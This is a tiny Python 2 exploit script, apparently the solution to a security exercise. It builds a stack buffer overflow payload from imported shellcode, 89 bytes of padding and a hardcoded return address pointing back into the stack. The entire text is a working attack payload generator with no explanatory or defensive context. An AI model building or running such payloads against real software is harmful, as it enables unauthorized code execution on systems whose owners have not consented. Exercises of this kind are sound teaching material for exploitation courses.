from struct import pack
from shellcode import shellcode 

shell_code_add = 0xbffe998c
print shellcode + "\xaa"*89 + pack("<I" , shell_code_add) 
